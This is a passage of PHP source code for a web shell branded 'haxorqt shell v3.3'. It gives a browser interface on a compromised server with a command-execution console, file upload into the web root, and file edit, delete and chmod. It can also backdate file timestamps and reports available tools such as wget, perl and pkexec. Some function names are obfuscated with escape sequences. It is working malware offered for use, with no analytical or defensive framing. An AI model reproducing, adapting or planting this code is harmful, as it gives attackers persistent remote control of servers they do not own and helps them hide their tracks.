    $fbiasa = array(""php"",""phtml"",""shtml"",""phar"",""php7"",""html"",""htm"",""inc"",""phps"",""txt"",""js"",""css"",""htaccess"",""bin"",""pl"",""py"",""sh"",""php58"",""PhP7"",""aspx"",""dll"",""ini"");
    $notf = array(""jpeg"",""jpg"",""png"",""gif"",""ico"",""webp"",""mp3"",""m4A"",""flac"",""wav"",""wma"",""3gp"",""ogg"",""webm"",""mp4"",""exe"");
    $stl = ""\x73\x74"" . ""\162\164"" . ""\157\154\x6f"" . ""\167\x65\162"";
    $ext=$stl(fext($file));
    if ($file == 'error_log') {
        return ""
<button type='submit' class='btn btn-outline-secondary badge-action-edit' name='pilih' value='edit'>
<i class='fa fa-edit' style='color: #36F239'></i></button>
<button type='submit' class='btn btn-outline-light badge-action-rename' name='pilih' value='gantinama'>
<i class='fa fa-pencil' style='color: #fff'></i></button>
<button type='submit' class='btn btn-outline-secondary badge-action-chmod' name='pilih' value='chmod'>
<i class='fa fa-gear' style='color: #06D2D5'></i></button>
<button type='submit' class='btn btn-outline-secondary badge-action-tanggal' name='pilih' value='chdate'>
<i class='fa fa-calendar' style='color: #4542F9'></i></button>
<button type='submit' class='btn btn-outline-secondary badge-action-delete' name='pilih' value='hapus'>
<i class='fa fa-trash' style='color: #E53A3A'></i></button>
<button type='submit' class='btn btn-outline-secondary badge-action-unzip' name='pilih' value='unzip'>
<i class='fa fa-file-archive-o' style='color: #F1BE0F'></i></button>"";
    } elseif(in_array($ext,$fbiasa)) {
        return ""
<button type='submit' class='btn btn-outline-secondary badge-action-edit' name='pilih' value='edit'>
<i class='fa fa-edit' style='color:#7AFF41'></i></button>
<button type='submit' class='btn btn-outline-light badge-action-rename' name='pilih' value='gantinama'>
<i class='fa fa-pencil'></i></button>
<button type='submit' class='btn btn-outline-info badge-action-chmod' name='pilih' value='chmod'>
<i class='fa fa-gear'></i></button>
<button type='submit' class='btn btn-outline-primary badge-action-tanggal' name='pilih' value='chdate'>
<i class='fa fa-calendar'></i></button>
<button type='submit' class='btn btn-outline-danger badge-action-delete' name='pilih' value='hapus'>
<i class='fa fa-trash'></i></button>"";
    } elseif(in_array($ext,$notf)) {
        return ""
<button type='submit' class='btn btn-outline-light badge-action-rename' name='pilih' value='gantinama'>
<i class='fa fa-pencil'></i></button>
<button type='submit' class='btn btn-outline-info badge-action-chmod' name='pilih' value='chmod'>
<i class='fa fa-gear'></i></button>
<button type='submit' class='btn btn-outline-primary badge-action-tanggal' name='pilih' value='chdate'>
<i class='fa fa-calendar'></i></button>
<button type='submit' class='btn btn-outline-danger badge-action-delete' name='pilih' value='hapus'>
<i class='fa fa-trash'></i></button>"";
    }  elseif($ext == 'zip') {
        return ""
<button type='submit' class='btn btn-outline-light badge-action-rename' name='pilih' value='gantinama'>
<i class='fa fa-pencil'></i></button>
<button type='submit' class='btn btn-outline-info badge-action-chmod' name='pilih' value='chmod'>
<i class='fa fa-gear'></i></button>
<button type='submit' class='btn btn-outline-primary badge-action-tanggal' name='pilih' value='chdate'>
<i class='fa fa-calendar'></i></button>
<button type='submit' class='btn btn-outline-danger badge-action-delete' name='pilih' value='hapus'>
<i class='fa fa-trash'></i></button>
<button type='submit' class='btn btn-outline-warning badge-action-unzip' name='pilih' value='unzip'>
<i class='fa fa-file-archive-o'></i></button>"";
    } else {
        return ""
<button type='submit' class='btn btn-outline-secondary badge-action-edit' name='pilih' value='edit'>
<i class='fa fa-edit' style='color:#7AFF41'></i></button>
<button type='submit' class='btn btn-outline-light badge-action-rename' name='pilih' value='gantinama'>
<i class='fa fa-pencil'></i></button>
<button type='submit' class='btn btn-outline-info badge-action-chmod' name='pilih' value='chmod'>
<i class='fa fa-gear'></i></button>
<button type='submit' class='btn btn-outline-primary badge-action-tanggal' name='pilih' value='chdate'>
<i class='fa fa-calendar'></i></button>
<button type='submit' class='btn btn-outline-danger badge-action-delete' name='pilih' value='hapus'>
<i class='fa fa-trash'></i></button>"";
    }
}

function unzip($file, $serlok) {
    if (!is_readable($file)) {
        red(""<table class='directory-listing-table' style='color:orange;'><thead><td><font color='orange'>Cannot Unzip File / Unreadable File !</font></td></thead></table>"");
        die();
    } elseif (strpos(file_get_contents($file), ""\x50\x4b\x03\x04"") === false) {
        echo ""<table class='directory-listing-table' style='border-color:red;'><td><font color='red'><center><i class='fa fa-exclamation-triangle' aria-hidden='true'></i> This isn't Zip File</center></font></td></table>"";
        die();
    }
    $zip = new ZipArchive;
    $res = $zip -> open($file);
    if ($res == true) {
        $zip -> extractTo($serlok);
        $zip -> close();
        echo ""<table class='directory-listing-table' style='border-color:lime;'> <td>Unzip File Successfully => <font color='lime'>"".basename($_POST['path']).""</font><br>
        Extract to : <font color='aqua'>"".$file.""</font></td></thead</table>"";
    } else {
        echo ""<table class='directory-listing-table' style='border-color:red;'><td><i class='fa fa-exclamation-triangle' aria-hidden='true'></i> Failed to Unzip File!!</font></td></table>"";
    }
    exit();
}
foreach($_POST as $key => $value){
    $_POST[$key] = stripslashes($value);
}

if(isset($_GET['path'])){
    $serlok = $_GET['path'];
    $serlok2 = $_GET['path'];
} else {
    $serlok = getcwd();
    $serlok2 = getcwd();
}

$serlok = str_replace('\\','/',$serlok);
$serloks = explode('/',$serlok);
$serlokbos = @scandir($serlok);


echo '<table class=""header""><td><center>
    <div style=""font-family:Bungee Outline;font-size:24px;""><a href=""'.$_SERVER['SCRIPT_NAME'].'""><i class=""fa-brands fa-napster""></i> haxorqt</a></center></div></td><td>';
echo '<table align=""center""><td>
<div class=""btn-group me-2"" role=""group"" aria-label=""First group"">
<button type=""button"" onclick=location.href=""'.$_SERVER['SCRIPT_NAME'].'"" class=""btn btn-outline-light""><font color=""aqua""><i class=""fa fa-home""></i> Home</font></button>
<div class=""btn-group me-2"" role=""group"" aria-label=""First group"">
<button type=""button"" onclick=location.href=""?path='.$serlok.'&'.net(""cmd"").'=opet"" class=""btn btn-outline-light""><i class=""fa fa-terminal""></i> Console</button>';

echo '<button type=""button"" onclick=location.href=""?path='.$serlok.'&'.net(""upload"").'=opet"" class=""btn btn-outline-light""><i class=""fa fa-upload""></i> Upload</button>

<button type=""button"" class=""btn btn-outline-light""onclick=location.href=""?path='.$serlok.'&'.net(""info"").'=opet""><i class=""fa fa-info-circle""></i> information</button>

<button type=""button"" class=""btn btn-outline-light"" onclick=location.href=""?path='.$serlok.'&'.net(""buatfile"").'=opet""><i class=""fa-solid fa-file-circle-plus"" style=""color:#1F5ACF;""></i> Create File</button>

<button type=""button"" class=""btn btn-outline-light"" onclick=location.href=""?path='.$serlok.'&'.net(""buatfolder"").'=opet"" style=""float: right;""><i class=""fa-solid fa-folder-plus"" style=""color:#FAA625;""></i> Create Folder</button>

<button type=""button"" class=""btn btn-outline-light"" onclick=location.href=""?path='.$serlok.'&'.net(""about"").'=opet"" style=""float: right;""><i class=""fa fa-info""></i> About</button>
</td></tr></div>
</div></div></td></table></table><br>';
echo '<table class=""directory-listing-table""><td><i class=""fa fa-folder"" style=""color:#F19013;""></i> <b>:</b> ';
foreach($serloks as $id => $lok){
    if($lok == '' && $id == 0){
        echo '<a href=""?path=/"">/&nbsp;</a></center>';
        continue;
    }
    if($lok == '') continue;
    echo '<a href=""?path=';
    for($i=0; $i<=$id; $i++){
    echo $serloks[$i];
    if($i != $id) echo ""/"";
} 
echo '"">'.$lok.'</a>&nbsp;/&nbsp;';
}
echo '</td></thead></table><br>';
    if (isset($_REQUEST['logout'])) {
        session_start();
        session_destroy();
        echo '<script>window.location=""'.$_SERVER['SCRIPT_NAME'].'"";</script>';
    }

if (isset($_GET['viewfile'])) {
    $files = basename($_GET['viewfile']);
    echo ""<table class='directory-listing-table'><td><center>Filename : <font color='orange'>$files</font>"";
    echo '<form method=""POST"" action=""?pilihan&path='.$serlok.'"">';
    echo ""<table width='20%' border='0' cellpadding='0' cellspacing='0' align='center'><td>
    <a href='?path=$serlok' class='btn btn-outline-light'><i class='fa fa-arrow-left'></i> back</a>"";
    echo gazz($file);
    echo ""<button type='button' style='float:right;' class='btn btn-outline-light' onclick='myFunction()'><i class='fa fa-copy'></i> Copy</button></div><br><br>"";
    echo ""<input type='hidden' name='type' value='file'>
    <input type='hidden' name='name' value='$files'>
    <input type='hidden' name='path' value='$serlok/$files'>"";
    echo ""<textarea readonly='' cols=120 rows=30 id='myInput'>"".htmlspecialchars(file_get_contents($_GET['viewfile'])).""</textarea></td></table></table><br>"";
    exit();
} elseif (isset($_GET['pilihan']) && $_POST['pilih'] == ""hapus"") {
    if (is_dir($_POST['path'])) {
        xrmdir($_POST['path']);
        if (file_exists($_POST['path'])) {
            echo '<table class=""directory-listing-table"" style=""border-color:red;""><td><center><font color=""red""><i class=""fa fa-exclamation-triangle"" aria-hidden=""true""></i> Failed to delete Directory</font></center></td></table>';
        } else {
            echo '<table class=""directory-listing-table"" style=""border-color:lime;""><td><center><font color=""lime""><i class=""fa fa-trash""></i> Folder removed</font></center></td></table>';
        }
    } elseif (is_file($_POST['path'])) {
        @unlink($_POST['path']);
        if (file_exists($_POST['path'])) {
            echo ""<table class='directory-listing-table' style='border-color:red;'><td><center><font color='red'><i class='fa fa-exclamation-triangle' aria-hidden='true'></i> Failed to Delete File</font></center></td></table>"";
        } else {
            echo ""<table class='directory-listing-table' style='border-color:lime;'><td><center><i class='fa fa-trash'></i> File removed <font color='lime'>"".basename($_POST['path']).""</font></center></td></table>"";
        }
    }
    exit();    
} elseif (isset($_GET['pilihan']) && $_POST['pilih'] == ""gantinama"") {
    if (isset($_POST['gantin'])) {
        $namabaru = $_GET['path'].""/"".$_POST['newname'];
        if (@rename($_POST['path'], $namabaru) === true) {
            echo ""<table class='directory-listing-table' style='border: 1px solid lime;'><td><center><font color='lime'>Change Name Success<center></td></table><br>"";
            if ($_POST['type'] == ""file"") {
                echo ""<table class='directory-listing-table'><td><center>Filename : <font color='orange'>"".basename($_POST['newname']).""</font><br><br>"";
            } else {
                echo ""<table class='directory-listing-table'><td><center><center>Folder : <font color='orange'>"".basename($_POST['newname']).""</font><br>"";
            }
            echo '<form method=""post"">
            <div class=""input-group mb-1"" style=""width:300px;"">
            <input name=""newname"" type=""text"" class=""form-control"" size=""20"" placeholder=""New name"" />
            <input type=""hidden"" name=""path"" value=""'.$_POST['newname'].'"">
            <input type=""hidden"" name=""pilih"" value=""gantinama"">';
            if ($_POST['type'] == ""file"") {
                echo '<input type=""hidden"" name=""type"" value=""file"">';
            } else {
                echo '<input type=""hidden"" name=""type"" value=""dir"">';
            }
            echo '<input type=""submit"" value=""Change"" name=""gantin"" class=""btn btn-outline-light mb-1"">
            </div></form></td></table>';
        } else {
            echo ""<table class='directory-listing-table' style='border: 1px solid red;'><td><center><font color='red'><i class='fa fa-exclamation-triangle' aria-hidden='true'></i> FAILED TO CHANGE NAME</font></center></td></table>"";
        }
    } else {
        if ($_POST['type'] == ""file"") {
            echo ""<table class='directory-listing-table'><td><center>Filename <font color='orange'>: "".basename($_POST['path'], $_GET['file']).""</font><br><br>"";
        } else {
            echo ""<table class='directory-listing-table'><td><center>Folder <font color='orange'>: "".basename($_POST['path']).""</font><br><br>"";
        }
        echo '
        <form method=""post"">
        <div class=""input-group mb-1"" style=""width:300px;"">
        <input name=""newname"" type=""text"" class=""form-control"" size=""20"" placeholder=""New name"" />
        <input type=""hidden"" name=""path"" value=""'.$_POST['path'].'"">
        <input type=""hidden"" name=""pilih"" value=""gantinama"">';
        if ($_POST['type'] == ""file"") {
            echo '<input type=""hidden"" name=""type"" value=""file"">';
        } else {
            echo '<input type=""hidden"" name=""type"" value=""dir"">';
        }
        echo '<input type=""submit"" value=""Change"" name=""gantin"" class=""btn btn-outline-light mb-1""/>
        </div></form></td></table><br>';
    } exit();
} elseif (isset($_GET['pilihan']) && $_POST['pilih'] == ""edit"") {
    if (isset($_POST['gasedit'])) {
        $edit = file_put_contents($_POST['path'], $_POST['src']);
        if ($edit == true) {
            echo ""<table class='directory-listing-table' style='border: 1px solid lime;'><td><center><font color='lime'>File saved Successfully</font></center></td></table><br>"";
        } else {
            echo ""<table class='directory-listing-table' style='border: 1px solid red;'><td><center><font color='red'><i class='fa fa-exclamation-triangle' aria-hidden='true'></i> Can't save file/Permission Denied</font></center></td></table><br>"";
        }
    }
    echo ""<center><table class='directory-listing-table'><td><center> Filename : <font color='orange'>"".basename($_POST['path']).""</font><br><br>"";
    echo '<form method=""post"">
    <div class=""btn-group me-2"" role=""group"" aria-label=""First group"">
    <a href=""?path='.$serlok.'"" class=""btn btn-outline-light""><i class=""fa fa-arrow-left""></i> back</a>
    <button type=""submit"" name=""gasedit"" class=""btn btn-outline-light""style=""width:250px;"">
    <i class=""fa fa-save""></i> Save</button>
    <button type=""button"" class=""btn btn-outline-light"" onclick=""myFunction()""><i class=""fa fa-copy""></i> Copy</button></div><br><br>
    <textarea type=""text"" cols=120 id=""myInput"" rows=30 name=""src"">'.htmlspecialchars(@file_get_contents($_POST['path'])).'</textarea><br>
    <input type=""hidden"" name=""path"" value=""'.$_POST['path'].'"">
    <input type=""hidden"" name=""pilih"" value=""edit"">
    </form><br></td></thead></table><br>'; exit();
} elseif (isset($_GET['pilihan']) && $_POST['pilih'] == ""chdatef"") {
    $filedate = basename($_POST['path']);
      $tgl = date(""F d Y g:i:s"", filemtime($_POST['path']));
          echo ""<table class='directory-listing-table'><td>
          <form method='post'><center>
          <font color='#fff'>Ubah Tanggal<br>Folder :</font> <font color='orange'>$filedate</font> 
          <br>$tgl<br><br><div class='input-group mb-3' style='width:280px;'>         
          <input name='tanggal' type='text' class='form-control' value='"".$_POST['tanggal'].""' placeholder='$tgl'/>
          <input type='hidden' name='path' value='"".$_POST['path'].""'>
          <input type='hidden' name='pilih' value='chdatef'>
          <button type='submit' class='btn btn-outline-light mb-1' name='change' value='change'>Change</button></div></form></center></td></table>"";
          if (isset($_POST['change'])) {
        $tanggal = strtotime($_POST['tanggal']);
        if (@touch($_POST['path'], $tanggal) == true) {
          echo ""<br><table class='directory-listing-table' style='border: 1px solid lime;'><td><center><font color='lime'><center>Changed Successfully!!</font></center></td></table>"";
        } else {
          echo ""<br><table class='directory-listing-table' style='border: 1px solid red;'><td><center><font color='red'><i class='fa fa-exclamation-triangle' aria-hidden='true'></i> Failed to change date!!</td></table>"";
        }
      }exit();
} elseif (isset($_GET['pilihan']) && $_POST['pilih'] == ""chdate"") {
    $filedate = basename($_POST['path']);
      $tgl = date(""F d Y g:i:s"", filemtime($_POST['path']));
          echo ""<table class='directory-listing-table'><td>
          <form method='post'><center><font color='#fff'>Ubah Tanggal<br>File :</font> <font color='orange'>$filedate <br></font>$tgl
          <br><br><div class='input-group mb-3' style='width:300px;'>
          <input name='tanggal' type='text' class='form-control' value='"".$_POST['tanggal'].""' placeholder='$tgl'/>
          <input type='hidden' name='path' value='"".$_POST['path'].""'>
          <input type='hidden' name='pilih' value='chdate'>
          <button type='submit' class='btn btn-outline-light mb-1' name='change' value='change'>Change</button>
          </div></form></center></td></table>"";
          if (isset($_POST['change'])) {
        $tanggal = strtotime($_POST['tanggal']);
        if (@touch($_POST['path'], $tanggal) == true) {
          echo ""<br><table class='directory-listing-table' style='border: 1px solid lime;'><td><center><font color='lime'><center>Changed Successfully!!</font></center></td></table>"";
        } else {
          echo ""<br><table class='directory-listing-table' style='border: 1px solid red;'><td><center><font color='red'><i class='fa fa-exclamation-triangle' aria-hidden='true'></i> Failed to change date!!</td></table>"";
        }
      }exit();
} elseif (isset($_GET['pilihan']) && $_POST['pilih'] == ""chmodf"") {
    $files = basename($_POST['path']);
    $sbr = 'substr'; $spr = 'sprintf'; $flperm = 'fileperms';
      echo ""<table class='directory-listing-table'><td>
      <br><center> <font color='#fff'>Folder : <font color='orange'>$files</font> ("".$sbr($spr('%o',$flperm($_POST['path'])), -4)."")<br><br>
      <form method='post'>
      <div class='input-group mb-3' style='width:230px;'>
    <input type='text' name='mod1' maxlength='4' class='form-control' height='10' value='"".$_POST['mod1'].""' placeholder='0755' required/> 
    <input type='hidden' name='path' value='"".$_POST['path'].""'>
    <input type='hidden' name='pilih' value='chmodf'>
    <button type='submit' class='btn btn-outline-light mb-1' name='ganti' value='ganti'>Change</button>
    </div></form></td></table>"";
    if (isset($_POST['ganti'])) {
      $opet = @chmod($_POST['path'], octdec($_POST['mod1']));
    if ($opet == true) {
        echo ""<br><table class='directory-listing-table' style='border: 1px solid lime;'><td><center><font color='lime'>Changed Successfully!!</font></center></td></table>"";
        } else {
            echo ""<table class='directory-listing-table' style='border: 1px solid red;'><td><center><font color='red'><i class='fa fa-exclamation-triangle' aria-hidden='true'></i> Failed to change!!</font></center></td></table>"";
        }
      }exit();
} elseif (isset($_GET['pilihan']) && $_POST['pilih'] == ""chmod"") {
    $files = basename($_POST['path']);
    $sbr = 'substr'; $spr = 'sprintf'; $flperm = 'fileperms';
      echo ""<table class='directory-listing-table'><td>
      <center><font color='#fff'>Filename : <font color='orange'>$files</font> ("".$sbr($spr('%o',$flperm($_POST['path'])), -4)."")<br><br>
      <form method='post'>
      <div class='input-group mb-3' style='width:230px;'>
    <input type='text' name='mod1' class='form-control' maxlength='4' height='10' value='"".$_POST['mod1'].""' placeholder='0644' required/> 
    <input type='hidden' name='path' value='"".$_POST['path'].""'>
    <input type='hidden' name='pilih' value='chmod'>
    <br><br><button type='submit' class='btn btn-outline-light mb-1' name='ganti' value='ganti'>Change</button></div>
    </form></td></table>"";
    if (isset($_POST['ganti'])) {
      $opet = @chmod($_POST['path'], octdec($_POST['mod1']));
    if ($opet == true) {
        echo ""<br><table class='directory-listing-table' style='border: 1px solid lime;'><td><center><font color='lime'>Changed Successfully!!</font></center></td></table>"";
        } else {
            echo ""<table class='directory-listing-table' style='border: 1px solid red;'><td><center><font color='red'><i class='fa fa-exclamation-triangle' aria-hidden='true'></i> Failed to change!!</font></center></td></table>"";
        }
      }exit();
} elseif (isset($_GET['pilihan']) && $_POST['pilih'] == ""unzip"") {
    unzip($_POST['path'], $serlok);

} elseif ($_REQUEST[net('upload')] == ""opet"") {
    echo ""<table class='directory-listing-table'><td><center>
    <form method='POST' enctype='multipart/form-data' id='upload'><h5><i class='fa fa-upload'></i> UPLOAD FILES<h5>
    <div class='input-group' style='width:360px;'>
    <input type='file' name='haxorqtfile' id='haxorqt' style='background-color: grey;' class='form-control' name='uplod'>
    <input type='submit' class='btn btn-outline-light' for='inputGroupFile02' name='uplod' value='Upload'></div>
              </form></center></td></table>"";
     if (isset($_POST['uplod'])) {
        if ($_POST['dirnya'] == ""2"") {
            $serlok = $_SERVER['DOCUMENT_ROOT'];
        }
        if (empty($_FILES['haxorqtfile']['name'])) {
            echo ""<br><table class='directory-listing-table' style='border-color:orange;'><td><font color='orange'><center><i class='fa fa-exclamation-triangle' aria-hidden='true'></i> File not selected</center></font>"";
        } else {
            $data = @file_put_contents($serlok.""/"".$_FILES['haxorqtfile']['name'], @file_get_contents($_FILES['haxorqtfile']['tmp_name']));
                if (file_exists($serlok.""/"".$_FILES['haxorqtfile']['name'])) {
                    $fl = $serlok.""/"".$_FILES['haxorqtfile']['name'];
                    echo ""<br><table class='directory-listing-table' style='border-color:lime;'><td>
                    Uploaded => <font color='lime'><i>"".$_FILES['haxorqtfile']['name'].""</i></font><br>"";
                    if (strpos($serlok, $_SERVER['DOCUMENT_ROOT']) !== false) {
                        $lwb = str_replace($_SERVER['DOCUMENT_ROOT'], $web.""/"", $fl);
                        echo ""Link : <a href='"".$lwb.""' target='_blank'><font color='lime'>Click here</font></a></td></table><br>"";
                    }
                    echo ""<br>"";
                } else {
                    echo ""<br><table class='directory-listing-table' style='border-color:red;'><td><font color='red'><center>There was an error uploading your file.</font></td></table>"";
            }
        }
    }exit(); 

} elseif ($_GET[net('cmd')] == ""opet"") {
    echo ""<table class='directory-listing-table'><td>"";
    echo '<br><form method=""post""><center>
    <div class=""input-group"" style=""width:600px;"">
    <span class=""input-group-text mb-1"">Command :</span>
     <input type=""text"" class=""form-control"" name=""komen"" id=""comandnya"" value=""'.$_POST['komen'].'"" placeholder=""uname -a"" required>
    <button type=""submit"" name=""comandeks"" value=""execute"" class=""btn btn-outline-light mb-1"">>></button></div></form><br><center>';
    if (isset($_POST['comandeks'])) {
        ekse($_POST['komen'], $serlok);
    }
    echo ""</center></td></table><br></center>"";
    exit();
} elseif ($_REQUEST[net('about')] == ""opet"") {
    echo ""<table class='directory-listing-table'><thead><td><div style='font-family: Bungee Outline;font-size:24px;'>
    <img class='crot' src='https://i.pinimg.com/564x/84/0e/4c/840e4c57fab2ba6279b377ae8dc333d3.jpg'/> Priv shell uwu edition</div><hr>
    <br> - haxorqt shell v3.3 <br> - Created by haxorqt</td></thead></table>""; exit();
} elseif ($_REQUEST[net('buatfile')] == ""opet"") {
    function createfile(){
        $pat = $_GET['path'];
        $nama_file = $_POST['nama_file'];
        $isi_file = $_POST['isi_file'];
        $handle = fopen(""$pat/$nama_file"", 'w');
        $files = $_GET['path'].""/"".$nama_file;
        $asu = str_replace($_SERVER['DOCUMENT_ROOT'], $web. """", $files);
        if (fwrite($handle, $isi_file)) {
            echo '<table class=""directory-listing-table"" style=""border-color:lime;""><td>Created =>&nbsp;<font color=""lime"">'.$pat.'/'.$nama_file.'<br></font>Link : <a href=""'.$asu.'"" target=""_blank""><font color=""aqua""><i>Click here</i></a></font></td></table>';
        } else {
            echo '<table class=""directory-listing-table"" style=""border-color:red;""><td><font color=red><i class=""fa fa-exclamation-triangle"" aria-hidden=""true""></i> Failed to create file..!!</font></script></td></table>';
        }
    } if(!isset($_POST['bikin'])) {
        echo ""<center><table class='directory-listing-table'><td width='12%''>
    <form method='POST'>
        <input type='text' value='file.php' placeholder='Nama File' style='width: 525px;' name='nama_file' autocomplete='off'><br><br>
        <textarea name='isi_file' rows='20' cols='100' placeholder='Hello World!'></textarea><br>
        <button type='sumbit' class='btn btn-outline-light' style='width:200px; height:36px;' height:30;' name='bikin'>CREATE</button>&nbsp;
        <a href='?path="".$serlok.""' class='btn btn-outline-light'>Back</a><br>
    </form></center>"";
        } else {
            createfile();
        }exit();
} elseif ($_GET[net('buatfolder')] == ""opet"") {
      function createDirectory() {
        if (empty($_POST['add'])) {
        echo '<table class=""directory-listing-table"" style=""border-color:orange;""><td><font color=""orange"">Folder field is required</font> [<a href=""?path='.$_GET['path'].'&'.net(""buatfolder"").'=opet""><i class=""fa-solid fa-folder-plus"" aria-hidden=""true""></i>Create again</a>]</td></table>';
        } else {
        $add = $_POST[""add""];
        $haxorqt = mkdir($_GET['path'].""/"".$add);
        if ($haxorqt == true) {
            echo ""<table class='directory-listing-table' style='border-color:lime;'><td>Created =><font color=lime> "".$_GET['path'].""/</font><font color='orange'>$add</font><br>
            <a href='?path="".$_GET['path'].""/$add'><u>Click Here</u></a></td></table>"";
    } else {
            echo ""<table class='directory-listing-table' style='border-color:red;'><td><font color=red><i class='fa fa-exclamation-triangle' aria-hidden='true'></i> Failed to create folder : $add</font></td></table>"";
                }
        }
}
        if (!isset($_POST['submit'])) {
            echo '<table class=""directory-listing-table""><td>
        <form action="""" method = ""POST""><h5><i class=""fa fa-folder-plus""></i> Create Folder</h5><hr><center>
        <div style=""width:300px;"">
         <input type=""text"" class=""form-control"" placeholder=""Folder Name"" name=""add"" id=""add""/><br></div>
        <button type=""submit"" class=""btn btn-outline-light"" name=""submit"" value=""Create directory"" style=""width:120px;"">Create</button>&nbsp;
        <a href=""?path='.$serlok.'"" class=""btn btn-outline-light"" style=""width:120px;"">Back</a><br><br></form></td></table>';
        } else {
            createDirectory();
        }exit();
} elseif ($_REQUEST[net('info')] == ""opet"") {
    echo ""<table class='directory-listing-table' align='center'>
    <div id='content'><tr><td>"";
    echo ""Server : <font color=orang>"".$_SERVER['HTTP_HOST'].""</font><br>"";
    echo ""Server IP : <font color=orange>"".ipserv().""</font> &nbsp;<br> Your IP : <font color=orange>"".$_SERVER['REMOTE_ADDR'].""</font><br>"";
    echo ""Web Server : <font color='orange'>"".$_SERVER['SERVER_SOFTWARE'].""</font><br>"";
    echo ""System : <font color='orange'>"".php_uname().""</font><br>"";
    echo ""User : <font color='orange'>"".@get_current_user().""&nbsp;</font>( <font color='orange'>"".@getmyuid().""</font>)<br>"";
    echo ""PHP Version : <font color='orange'>"".@phpversion().""&nbsp;</font>=><font color='orange'>&nbsp;"".php_sapi_name().""</font><br>"";
    echo ""</tr></td><tr><td>Disable Function : "".$disf.""</font>"";
    echo ""</div></tr></td><tr><td>"";
    echo ""<hr>Orecle : "";
if (function_exists('oci_connect')) {
        echo ""<font color=lime>ON</font>"";
} else {
    echo ""<font color=red>OFF</font>"";

    echo ""&nbsp;| SSH2 : "";
}

if (function_exists('ssh2_connect')) {
    echo ""<font color=lime>ON</font>"";
} else {
    echo ""<font color=red>OFF</font>"";

    echo ""&nbsp;| MySQL : "";
}
if (function_exists(""mysql_connect"")) {
    echo ""<font color=lime>ON</font>"";
} else {
    echo ""<font color=red>OFF</font>"";
}
echo "" &nbsp;| cURL : "";
if (function_exists(""curl_init"")) {
    echo ""<font color=lime>ON</font>"";
} else {
    echo ""<font color=red>OFF</font>"";
}
echo "" &nbsp;| WGET : "";
if (file_exists(""/usr/bin/wget"")) {
    echo ""<font color=lime>ON</font>"";
} else {
    echo ""<font color=red>OFF</font>"";
}
echo "" &nbsp;| Perl : "";
if (file_exists(""/usr/bin/perl"")) {
    echo ""<font color=lime>ON</font>"";
} else {
    echo ""<font color=red>OFF</font>"";
}
echo "" &nbsp;| Python : "";
if (file_exists(""/usr/bin/python2"")) {
    echo ""<font color=lime>ON</font>"";
} else {
    echo ""<font color=red>OFF</font>"";
}
$pkexec = (@shell_exec(""pkexec --version"")) ? ""<font color='lime'>ON</font>"" : ""<font color='red'>OFF</font>"";
    echo "" | PKEXEC : $pkexec<br><br>"";
    echo ""</tr></td></table><br>"";
    exit();

}


if (!is_readable($serlok)) {
    die(""<table class='directory-listing-table'><thead><td><center><font color=orange>This directory is unreadable :(</font></center></td></thead></table>"");
}

echo '<table class=""table table-dark table-hover"" style=""box-shadow: 0 0 20px black;width:90%;border-left:1px solid #ffc107;border-right:1px solid #ffc107;border-bottom:1px solid #ffc107;--bs-border-radius:80rem;"" align=""center"">
<thead style=""--bs-table-bg:#ffc107;--bs-table-color:#000;""><tr>
<th><center>Name</center></th>
<th><center>Size</center></th>
<th><center>Last Modified</center></th>
<th><center>Owner</center></th>
<th><center>Permissions</center></th>
<th><center>Actions</center></th>
</tr></thead><center>';
$scd = ""\163\143"".""\141\156\144"".""\151\162"";
if(is_readable($serlok)){
            $fetch=$scd($serlok);
            $serlokbos=array();
            $filez=array();
            foreach($fetch as $fols){
                if($fols=='.'||$fols=='..'){
                    continue;
                }
                    $haxorqts=$serlok.'/'.$fols;
                    if(is_dir($haxorqts)){
                        array_push($serlokbos,$fols);
                    }elseif(is_file($haxorqts)){
                        array_push($filez,$fols);
                    }
                }
            }
foreach($serlokbos as $dir){
    echo ""<tr>
    <td><i class='fa fa-folder' style='color: #FAA625'></i> <a href=\""?path="".$serlok.""/"".$dir.""\"">"".$dir.""</a></td>
    <td><center>Dir</center></td>
    <td><center>"".filedate($serlok.""/"".$dir).""</center></td>
    <td>"".owner($serlok.""/"".$dir).""</td>
    <td><center>"";
    if(is_writable($serlok.""/"".$dir)) echo '<font color=""lime"">';
    elseif(!is_readable($serlok.""/"".$dir)) echo '<font color=""red"">';
    echo statusnya($serlok.""/"".$dir);
    if(is_writable($serlok.""/"".$dir) || !is_readable($serlok.""/"".$dir)) echo '</font>';

    echo ""</center></td>
    <td><center><form method=\""POST\"" action=\""?pilihan&path=$serlok\"">
    <div class='btn-group me-2' role='group' aria-label='First group'>
    <button type='submit' class='btn btn-outline-secondary badge-action-rename' name='pilih' value='gantinama'>
    <i class='fa fa-pencil' style='color: #fff'></i></button>
    <button type='submit' class='btn btn-outline-secondary badge-action-chmod' name='pilih' value='chmodf'><i class='fa fa-gear' style='color: #06D2D5'></i></button>
    <button type='submit' class='btn btn-outline-secondary badge-action-tanggal' name='pilih' value='chdatef'><i class='fa fa-calendar' style='color: #5654F5'></i></button>
    <button type='submit' class='btn btn-outline-secondary badge-action-delete' name='pilih' value='hapus'><i class='fa fa-trash' style='color: #E53A3A'></i></button></div>
    <input type=\""hidden\"" name=\""type\"" value=\""dir\"">
    <input type=\""hidden\"" name=\""name\"" value=\""$dir\"">
    <input type=\""hidden\"" name=\""path\"" value=\""$serlok/$dir\"">
    </form></center></td>
    </tr>"";
}

foreach($filez as $file) {
    if(!is_file(""$serlok/$file"")) continue;
        $size = filesize(""$serlok/$file"")/1024;
        $size = round($size,3);
        if($size >= 1024){
        $size = '<font color=""aqua"">'.round($size/1024,2).'</font> MB';
    } else {
        $size = '<font color=""#E6F01C"">'.$size.'</font> KB';
    }
echo ""<tr>
<td>"".cekfile($serlok.""/"".$file).""
<a href=\""?viewfile="".$serlok.""/$file&path="".$serlok.""\"">$file</a></td>
<td><center>"".$size.""</center></td>
<td><center>"".filedate($serlok.""/"".$file).""</center></td>
<td>"".owner($serlok.""/"".$file).""</td>
<td><center>"";
if(is_writable(""$serlok/$file"")) echo '<font color=""lime"">';
elseif(!is_readable(""$serlok/$file"")) echo '<font color=""red"">';
echo statusnya(""$serlok/$file"");
if(is_writable(""$serlok/$file"") || !is_readable(""$serlok/$file"")) echo '</font>';
echo ""</center></td><td><center>
<form method='post' action='?pilihan&path=$serlok'>
<div class='btn-group' role='group' aria-label='First group'>"";
echo gazz($file);
echo ""</div><input type=\""hidden\"" name=\""type\"" value=\""file\"">
<input type=\""hidden\"" name=\""name\"" value=\""$file\"">
<input type=\""hidden\"" name=\""path\"" value=\""$serlok/$file\"">
</form></center></td></tr>"";
}
echo '</tr></td></table></table>';
author();

